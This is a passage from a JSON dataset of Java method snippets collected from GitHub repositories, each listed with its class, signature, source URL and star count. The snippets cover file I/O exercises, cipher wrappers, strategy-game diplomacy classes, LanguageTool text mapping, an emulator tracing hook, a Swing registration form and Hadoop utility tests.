"https://raw.githubusercontent.com/guozaizai/myHttpSdkDemo/master/app/src/main/java/myapp/com/xm/myapplication/Presenter/RequestPresenter.java", "stars": "9", "class_props": {"extends": "BasePresenter", "implements": ["IRequest"], "modifiers": ["public"]}}, {"id": 56825, "method_name": "main", "class_name": "Demo05Test", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {\n        //1.\u521b\u5efa\u4e00\u4e2aHashMap\u96c6\u5408\u5bf9\u8c61,\u53ef\u4ee5:\u5b58\u50a8\u6bcf\u884c\u6587\u672c\u7684\u5e8f\u53f7(1,2,3,..);value:\u5b58\u50a8\u6bcf\u884c\u7684\u6587\u672c\n        HashMap<String,String> map = new HashMap<>();\n        //2.\u521b\u5efa\u5b57\u7b26\u7f13\u51b2\u8f93\u5165\u6d41\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u7ed1\u5b9a\u5b57\u7b26\u8f93\u5165\u6d41\n        BufferedReader br = new BufferedReader(new FileReader(\"10_IO\\\\in.txt\"));\n        //3.\u521b\u5efa\u5b57\u7b26\u7f13\u51b2\u8f93\u51fa\u6d41\u5bf9\u8c61,\u6784\u9020\u65b9\u6cd5\u4e2d\u7ed1\u5b9a\u5b57\u7b26\u8f93\u51fa\u6d41\n        BufferedWriter bw = new BufferedWriter(new FileWriter(\"10_IO\\\\out.txt\"));\n        //4.\u4f7f\u7528\u5b57\u7b26\u7f13\u51b2\u8f93\u5165\u6d41\u4e2d\u7684\u65b9\u6cd5readline,\u9010\u884c\u8bfb\u53d6\u6587\u672c\n        String line;\n        while((line = br.readLine())!=null){\n            //5.\u5bf9\u8bfb\u53d6\u5230\u7684\u6587\u672c\u8fdb\u884c\u5207\u5272,\u83b7\u53d6\u884c\u4e2d\u7684\u5e8f\u53f7\u548c\u6587\u672c\u5185\u5bb9\n            String[] arr = line.split(\"\\\\.\");\n            //6.\u628a\u5207\u5272\u597d\u7684\u5e8f\u53f7\u548c\u6587\u672c\u7684\u5185\u5bb9\u5b58\u50a8\u5230HashMap\u96c6\u5408\u4e2d(key\u5e8f\u53f7\u662f\u6709\u5e8f\u7684,\u4f1a\u81ea\u52a8\u6392\u5e8f1,2,3,4..)\n            map.put(arr[0],arr[1]);\n        }\n\n        //7.\u904d\u5386HashMap\u96c6\u5408,\u83b7\u53d6\u6bcf\u4e00\u4e2a\u952e\u503c\u5bf9\n        for(String key : map.keySet()){\n            String value = map.get(key);\n            //8.\u628a\u6bcf\u4e00\u4e2a\u952e\u503c\u5bf9,\u62fc\u63a5\u4e3a\u4e00\u4e2a\u6587\u672c\u884c\n            line = key + \".\" + value;\n            //9.\u628a\u62fc\u63a5\u597d\u7684\u6587\u672c,\u4f7f\u7528\u5b57\u7b26\u7f13\u51b2\u8f93\u51fa\u6d41\u4e2d\u7684\u65b9\u6cd5write,\u5199\u5165\u5230\u6587\u4ef6\u4e2d\n            bw.write(line);\n            bw.newLine();//\u5199\u6362\u884c\n        }\n        //10.\u91ca\u653e\u8d44\u6e90\n        bw.close();\n        br.close();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/17.%E3%80%90%E7%BA%BF%E7%A8%8B%E3%80%81%E5%90%8C%E6%AD%A5%E3%80%91-%E7%AC%94%E8%AE%B0/21.%E3%80%90%E7%BC%93%E5%86%B2%E6%B5%81%E3%80%81%E8%BD%AC%E6%8D%A2%E6%B5%81%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E3%80%81%E6%89%93%E5%8D%B0%E6%B5%81%E3%80%91-%E7%AC%94%E8%AE%B0/code/10_IO/src/com/itheima/demo01/BufferedStream/Demo05Test.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56826, "method_name": "encrypt", "class_name": "CipherImpl", "params": ["byte"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] encrypt(@NonNull byte[] data) throws Exception {\n        Preconditions.checkNotNull(data);\n        return DES.encrypt(mKey, mKeyIv, data);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/encryption-core/src/main/java/com/cobo/cold/encryptioncore/cipher/CipherImpl.java", "stars": "13", "class_props": {"extends": null, "implements": ["Cipher"], "modifiers": ["public"]}}, {"id": 56827, "method_name": "decrypt", "class_name": "CipherImpl", "params": ["byte"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] decrypt(@NonNull byte[] encrypted) throws Exception {\n        Preconditions.checkNotNull(encrypted);\n        return DES.decrypt(mKey, mKeyIv, encrypted);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/encryption-core/src/main/java/com/cobo/cold/encryptioncore/cipher/CipherImpl.java", "stars": "13", "class_props": {"extends": null, "implements": ["Cipher"], "modifiers": ["public"]}}, {"id": 56828, "method_name": "generateData", "class_name": "BigDataGenerator", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void generateData() {\n        super.generate(NUMBER_OF_GARDEN_FIELDS_TO_GENERATE, NUMBER_OF_USERS_TO_GENERATE, NUMBER_OF_OPEN_LEASINGS_TO_GENERATE,\n            NUMBER_OF_RESERVED_LEASINGS_TO_GENERATE, NUMBER_OF_MESSAGES_THREADS, NUMBER_OF_MESSAGES,\n            MIN_NUMBER_OF_IMAGES_PER_GARDENFIELD, MAX_NUMBER_OF_IMAGES_PER_GARDENFIELD, BATCH_SIZE);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/datagenerator/BigDataGenerator.java", "stars": "2", "class_props": {"extends": "DataGenerator", "implements": null, "modifiers": ["public"]}}, {"id": 56829, "method_name": "create", "class_name": "ExchangeTechnologyIncident", "params": ["Empire", "Empire", "Tech", "Tech"], "throws": null, "modifiers": ["public", "static"], "return_type": "ExchangeTechnologyIncident", "snippet": "    public static ExchangeTechnologyIncident create(Empire e1, Empire e2, Tech recv, Tech give) {\n        ExchangeTechnologyIncident inc = new ExchangeTechnologyIncident(e1, e2, recv, give);\n        return inc;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ExchangeTechnologyIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 56830, "method_name": "title", "class_name": "ExchangeTechnologyIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String title()        { return text(\"INC_TECH_EXCHANGE_TITLE\"); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ExchangeTechnologyIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 56831, "method_name": "description", "class_name": "ExchangeTechnologyIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String description()  { return decode(text(\"INC_TECH_EXCHANGE_DESC\")); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ExchangeTechnologyIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 56832, "method_name": "key", "class_name": "ExchangeTechnologyIncident", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String key()          { return \"Exchange Technology\"; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ExchangeTechnologyIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 56833, "method_name": "decode", "class_name": "ExchangeTechnologyIncident", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String decode(String s) {\n        String s1 = super.decode(s);\n        s1 = galaxy().empire(empMe).replaceTokens(s1, \"my\");\n        s1 = galaxy().empire(empYou).replaceTokens(s1, \"your\");\n        s1 = s1.replace(\"[techReceived]\", tech(received).name());\n        s1 = s1.replace(\"[techGiven]\", tech(given).name());\n        return s1;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/incidents/ExchangeTechnologyIncident.java", "stars": "74", "class_props": {"extends": "DiplomaticIncident", "implements": null, "modifiers": ["public"]}}, {"id": 56834, "method_name": "getDescription", "class_name": "Mocha", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDescription() {\n        return this.beverage.getDescription() + \" , Mocha\";\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Decorator%20Pattern/src/Condiments/Mocha.java", "stars": "38", "class_props": {"extends": "CondimentDecorator", "implements": null, "modifiers": ["public"]}}, {"id": 56835, "method_name": "cost", "class_name": "Mocha", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double cost() {\n        return this.beverage.cost() + 1.5;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Decorator%20Pattern/src/Condiments/Mocha.java", "stars": "38", "class_props": {"extends": "CondimentDecorator", "implements": null, "modifiers": ["public"]}}, {"id": 56836, "method_name": "initialize", "class_name": "AnnotatedText", "params": ["List<TextPart>", "List<Map>", "Map<MetaDataKey,String>", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void initialize(List<TextPart> parts, List<Map.Entry<Integer, Integer>> mapping,\n      Map<MetaDataKey, String> metaData, Map<String, String> customMetaData) {\n    this.parts = Objects.requireNonNull(parts);\n    this.mapping = copyMapping(Objects.requireNonNull(mapping));\n    this.mappingEntryComparator = new MappingEntryComparator();\n    Collections.sort(this.mapping, this.mappingEntryComparator);\n    this.metaData = Objects.requireNonNull(metaData);\n    this.customMetaData = Objects.requireNonNull(customMetaData);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56837, "method_name": "getOriginalText", "class_name": "AnnotatedText", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getOriginalText() {\n    StringBuilder sb = new StringBuilder();\n    for (TextPart part : parts) {\n      if (part.getType() == TextPart.Type.TEXT) {\n        sb.append(part.getPart());\n      }\n    }\n    return sb.toString();\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56838, "method_name": "getPlainText", "class_name": "AnnotatedText", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getPlainText() {\n    StringBuilder sb = new StringBuilder();\n    for (TextPart part : parts) {\n      if (part.getType() == TextPart.Type.TEXT || part.getType() == TextPart.Type.FAKE_CONTENT) {\n        sb.append(part.getPart());\n      }\n    }\n    return sb.toString();\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56839, "method_name": "getTextWithMarkup", "class_name": "AnnotatedText", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getTextWithMarkup() {\n    StringBuilder sb = new StringBuilder();\n    for (TextPart part : parts) {\n      if (part.getType() != TextPart.Type.FAKE_CONTENT) {\n        sb.append(part.getPart());\n      }\n    }\n    return sb.toString();\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56840, "method_name": "getMapping", "class_name": "AnnotatedText", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Map>", "snippet": "  public List<Map.Entry<Integer, Integer>> getMapping() {\n    return copyMapping(mapping);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56841, "method_name": "copyMapping", "class_name": "AnnotatedText", "params": ["List<Map>"], "throws": null, "modifiers": ["static", "private"], "return_type": "List<Map>", "snippet": "  private static List<Map.Entry<Integer, Integer>> copyMapping(\n      List<Map.Entry<Integer, Integer>> mapping) {\n    List<Map.Entry<Integer, Integer>> result = new ArrayList<>();\n\n    for (Map.Entry<Integer, Integer> entry : mapping) {\n      result.add(new AbstractMap.SimpleEntry<>(entry.getKey(), entry.getValue()));\n    }\n\n    return result;\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56842, "method_name": "getOriginalTextPositionFor", "class_name": "AnnotatedText", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getOriginalTextPositionFor(int plainTextPosition) {\n    if (plainTextPosition < 0) {\n      throw new IllegalArgumentException(\"plainTextPosition must be >= 0: \" + plainTextPosition);\n    } else if (mapping.isEmpty()) {\n      throw new IllegalArgumentException(\"mapping must be non-empty\");\n    } else if (mapping.size() == 1) {\n      return mapping.get(0).getValue();\n    }\n\n    Map.Entry<Integer, Integer> entry =\n        new AbstractMap.SimpleEntry<>(plainTextPosition, Integer.MAX_VALUE);\n    int i = -Collections.binarySearch(mapping, entry, mappingEntryComparator) - 1;\n    if (i <= 0) i = 1;\n    if (i >= mapping.size()) i = mapping.size() - 1;\n\n    Map.Entry<Integer, Integer> lowerNeighbor = mapping.get(i - 1);\n    Map.Entry<Integer, Integer> upperNeighbor = mapping.get(i);\n\n    if (lowerNeighbor.getKey() == plainTextPosition) {\n      return lowerNeighbor.getValue();\n    } else {\n      float t = (float)(plainTextPosition - lowerNeighbor.getKey()) /\n          (float)(upperNeighbor.getKey() - lowerNeighbor.getKey());\n      int result = Math.round((1 - t) * lowerNeighbor.getValue() + t * upperNeighbor.getValue());\n      return result;\n    }\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56843, "method_name": "getOriginalTextPositionFor", "class_name": "AnnotatedText", "params": ["int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getOriginalTextPositionFor(int plainTextPosition, boolean isToPos) {\n    return getOriginalTextPositionFor(plainTextPosition);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56844, "method_name": "getGlobalMetaData", "class_name": "AnnotatedText", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getGlobalMetaData(String key, String defaultValue) {\n    return customMetaData.getOrDefault(key, defaultValue);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56845, "method_name": "getGlobalMetaData", "class_name": "AnnotatedText", "params": ["MetaDataKey", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getGlobalMetaData(MetaDataKey key, String defaultValue) {\n    return metaData.getOrDefault(key, defaultValue);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56846, "method_name": "toString", "class_name": "AnnotatedText", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {\n    return StringUtils.join(parts, \"\");\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56847, "method_name": "compare", "class_name": "MappingEntryComparator", "params": ["Map", "Map"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int compare(Map.Entry<Integer, Integer> o1, Map.Entry<Integer, Integer> o2) {\n      int result = o1.getKey().compareTo(o2.getKey());\n      if (result == 0) result = o1.getValue().compareTo(o2.getValue());\n      return result;\n    }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/languagetool-patch/src/main/java/org/languagetool/markup/AnnotatedText.java", "stars": "3", "class_props": {"extends": null, "implements": ["Comparator"], "modifiers": ["private"]}}, {"id": 56848, "method_name": "initialize", "class_name": "AssemblyCodeDumper", "params": ["long", "long", "TraceCodeListener"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void initialize(long begin, long end, TraceCodeListener listener) {\n        this.traceInstruction = true;\n        this.traceBegin = begin;\n        this.traceEnd = end;\n        this.listener = listener;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/AssemblyCodeDumper.java", "stars": "16", "class_props": {"extends": null, "implements": ["CodeHook"], "modifiers": []}}, {"id": 56849, "method_name": "canTrace", "class_name": "AssemblyCodeDumper", "params": ["long"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean canTrace(long address) {\n        return traceInstruction && (traceBegin > traceEnd || (address >= traceBegin && address <= traceEnd));\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/AssemblyCodeDumper.java", "stars": "16", "class_props": {"extends": null, "implements": ["CodeHook"], "modifiers": []}}, {"id": 56850, "method_name": "hook", "class_name": "AssemblyCodeDumper", "params": ["Unicorn", "long", "int", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void hook(Unicorn u, long address, int size, Object user) {\n        if (canTrace(address)) {\n            try {\n                PrintStream out = System.out;\n                if (redirect != null) {\n                    out = redirect;\n                }\n                Capstone.CsInsn[] insns = emulator.printAssemble(out, address, size);\n                if (listener != null) {\n                    if (insns == null || insns.length != 1) {\n                        throw new IllegalStateException(\"insns=\" + Arrays.toString(insns));\n                    }\n                    listener.onInstruction(emulator, address, insns[0]);\n                }\n            } catch (UnicornException e) {\n                throw new IllegalStateException(e);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/AssemblyCodeDumper.java", "stars": "16", "class_props": {"extends": null, "implements": ["CodeHook"], "modifiers": []}}, {"id": 56851, "method_name": "diplomat", "class_name": "OfferAllianceMessage", "params": ["Empire"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void diplomat(Empire e)  {\n        super.diplomat(e);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferAllianceMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 56852, "method_name": "numReplies", "class_name": "OfferAllianceMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int numReplies()       \t\t{ return 2; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferAllianceMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 56853, "method_name": "enabled", "class_name": "OfferAllianceMessage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean enabled(int i)       { return true; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferAllianceMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 56854, "method_name": "reply", "class_name": "OfferAllianceMessage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String reply(int i)          { \n        switch (i) {\n            case 0 : return text(\"DIPLOMACY_ACCEPT_FORM_ALLIANCE\");\n            case 1 : return text(\"DIPLOMACY_DECLINE_OFFER\");\n        }\n        return \"\"; \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferAllianceMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 56855, "method_name": "select", "class_name": "OfferAllianceMessage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void select(int i) {\n        log(\"OfferPactMessage - selected: \", str(i));\n        switch(i) {\n        case 0: \n            DiplomaticReply reply = player().diplomatAI().acceptOfferAlliance(diplomat());\n            reply.resumeTurn(true);\n            DiplomaticMessage.reply(DiplomacyRequestReply.create(diplomat(), reply));\t\n            break;\n        case 1: \n        default:\n            escape(); break;\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferAllianceMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 56856, "method_name": "escape", "class_name": "OfferAllianceMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void escape() {\n        player().diplomatAI().refuseOfferAlliance(diplomat());\n        session().resumeNextTurnProcessing();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferAllianceMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 56857, "method_name": "decode", "class_name": "OfferAllianceMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String decode(String encodedMessage) { \n        String s1 = super.decode(encodedMessage); \n        return s1;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/diplomacy/OfferAllianceMessage.java", "stars": "74", "class_props": {"extends": "TurnNotificationMessage", "implements": null, "modifiers": ["public"]}}, {"id": 56858, "method_name": "main", "class_name": "RegistFrame", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tnew RegistFrame();\n\t}", "url": "https://raw.githubusercontent.com/tianyu-zou/transport-log/master/RegistFrame.java", "stars": "3", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56859, "method_name": "actionPerformed", "class_name": "RegisterListener", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t// \u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\n\t\t\tString userName = txtName.getText().trim();\n\t\t\tString password = new String(txtPwd.getPassword());\n\t\t\tString rePassword = new String(txtRePwd.getPassword());\n\t\t\t// \u5c06\u6027\u522b\u201c\u7537\u201d\u201c\u5973\u201d\u5bf9\u5e94\u8f6c\u5316\u4e3a\u201c1\u201d\u201c0\u201d\n\t\t\tint sex = Integer.parseInt(rbFemale.isSelected() ? \"0\" : \"1\");\n\t\t\tString hobby = (ckbRead.isSelected() ? \"\u9605\u8bfb\" : \"\")\n\t\t\t\t\t+ (ckbNet.isSelected() ? \"\u4e0a\u7f51\" : \"\")\n\t\t\t\t\t+ (ckbSwim.isSelected() ? \"\u6e38\u6cf3\" : \"\")\n\t\t\t\t\t+ (ckbTour.isSelected() ? \"\u65c5\u6e38\" : \"\");\n\t\t\tString address = txtAdress.getText().trim();\n\t\t\tString degree = cmbDegree.getSelectedItem().toString().trim();\n\t\t\t// \u5224\u65ad\u4e24\u6b21\u8f93\u5165\u5bc6\u7801\u662f\u5426\u4e00\u81f4\n\t\t\tif (password.equals(rePassword)) {\n\t\t\t\t// \u5c06\u6570\u636e\u5c01\u88c5\u5230\u5bf9\u8c61\u4e2d\n\t\t\t\tuser = new User(userName, password, sex, hobby, address, degree);\n\t\t\t\t// \u4fdd\u5b58\u6570\u636e\n\t\t\t\tif (userService.saveUser(user)) {\n\t\t\t\t\t// \u8f93\u51fa\u63d0\u793a\u4fe1\u606f\n\t\t\t\t\t//System.out.println(\"\u6ce8\u518c\u6210\u529f\uff01\");\n\t\t\t\t\tJOptionPane.showMessageDialog(null,\"\u6ce8\u518c\u6210\u529f\uff01\",\"\u6210\u529f\u63d0\u793a\",JOptionPane.PLAIN_MESSAGE);\n\t\t\t\t} else {\n\t\t\t\t\t// \u8f93\u51fa\u63d0\u793a\u4fe1\u606f\n\t\t\t\t\t//System.out.println(\"\u6ce8\u518c\u5931\u8d25\uff01\");\n\t\t\t\t\tJOptionPane.showMessageDialog(null,\"\u6ce8\u518c\u5931\u8d25\uff01\",\"\u9519\u8bef\u63d0\u793a\",JOptionPane.ERROR_MESSAGE);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\t// \u8f93\u51fa\u63d0\u793a\u4fe1\u606f\n\t\t\t\t//System.out.println(\"\u4e24\u6b21\u8f93\u5165\u7684\u5bc6\u7801\u4e0d\u4e00\u81f4\uff01\");\n\t\t\t\tJOptionPane.showMessageDialog(null,\"\u4e24\u6b21\u8f93\u5165\u7684\u5bc6\u7801\u4e0d\u4e00\u81f4\uff01\",\"\u9519\u8bef\u63d0\u793a\",JOptionPane.ERROR_MESSAGE);\n\t\t\t}\n\t\t}", "url": "https://raw.githubusercontent.com/tianyu-zou/transport-log/master/RegistFrame.java", "stars": "3", "class_props": {"extends": null, "implements": ["ActionListener"], "modifiers": ["private"]}}, {"id": 56860, "method_name": "actionPerformed", "class_name": "ResetListener", "params": ["ActionEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t// \u6e05\u7a7a\u59d3\u540d\u3001\u5bc6\u7801\u3001\u786e\u8ba4\u5bc6\u7801\u5185\u5bb9\n\t\t\ttxtName.setText(\"\");\n\t\t\ttxtPwd.setText(\"\");\n\t\t\ttxtRePwd.setText(\"\");\n\t\t\t// \u91cd\u7f6e\u5355\u9009\u6309\u94ae\u4e3a\u672a\u9009\u62e9\n\t\t\trbMale.setSelected(false);\n\t\t\trbFemale.setSelected(false);\n\t\t\t// \u91cd\u7f6e\u6240\u6709\u7684\u590d\u9009\u6309\u94ae\u4e3a\u672a\u9009\u62e9\n\t\t\tckbRead.setSelected(false);\n\t\t\tckbNet.setSelected(false);\n\t\t\tckbSwim.setSelected(false);\n\t\t\tckbTour.setSelected(false);\n\t\t\t// \u6e05\u7a7a\u5730\u5740\u680f\n\t\t\ttxtAdress.setText(\"\");\n\t\t\t// \u91cd\u7f6e\u7ec4\u5408\u6846\u4e3a\u672a\u9009\u62e9\u72b6\u6001\n\t\t\tcmbDegree.setSelectedIndex(0);\n\t\t}", "url": "https://raw.githubusercontent.com/tianyu-zou/transport-log/master/RegistFrame.java", "stars": "3", "class_props": {"extends": null, "implements": ["ActionListener"], "modifiers": ["public"]}}, {"id": 56861, "method_name": "beforeMethod", "class_name": "TestHadoopJobUtilsExecutionJar", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void beforeMethod() throws IOException {\n    if (workingDirFile.exists())\n      FileUtils.deleteDirectory(workingDirFile);\n    workingDirFile.mkdirs();\n    libFolderFile.mkdirs();\n    executionJarFile.createNewFile();\n    libraryJarFile.createNewFile();\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsExecutionJar.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56862, "method_name": "testNoLibFolder", "class_name": "TestHadoopJobUtilsExecutionJar", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void testNoLibFolder() throws IOException {\n    FileUtils.deleteDirectory(libFolderFile);\n    String retval = HadoopJobUtils.resolveWildCardForJarSpec(workingDirString, \"./lib/*\", logger);\n\n    Assert.assertEquals(retval, \"\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsExecutionJar.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56863, "method_name": "testLibFolderHasNothingInIt", "class_name": "TestHadoopJobUtilsExecutionJar", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void testLibFolderHasNothingInIt() throws IOException {\n    FileUtils.deleteDirectory(libFolderFile);\n    libFolderFile.mkdirs();\n    String retval = HadoopJobUtils.resolveWildCardForJarSpec(workingDirString, \"./lib/*\", logger);\n\n    Assert.assertEquals(retval, \"\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsExecutionJar.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56864, "method_name": "testOneLibFolderExpansion", "class_name": "TestHadoopJobUtilsExecutionJar", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void testOneLibFolderExpansion() throws IOException {\n    String retval = 